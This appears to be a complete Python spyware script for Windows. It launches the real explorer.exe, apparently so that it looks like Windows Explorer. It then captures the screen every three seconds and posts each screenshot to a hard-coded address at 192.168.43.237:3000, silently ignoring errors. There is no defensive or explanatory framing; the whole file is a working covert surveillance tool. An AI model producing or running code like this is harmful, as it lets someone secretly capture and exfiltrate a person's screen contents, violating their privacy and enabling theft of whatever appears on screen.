import requests
import time
import mss
import os

url = "http://192.168.43.237:3000"
screenshotPath = os.path.join(os.environ['TEMP'], "screenshot.jpg")

def screenShot():
    with mss.mss() as sct:
        sct.shot(output=screenshotPath)
        requests.post(url, files={"screenshot": open(screenshotPath, "rb") })

def main():
    try:
        screenShot()
    except:
        pass

    time.sleep(3)
    main()

if __name__ == "__main__":
    originalExplorer = os.path.join(os.environ['windir'], "explorer.exe")
    os.startfile(originalExplorer)
    main()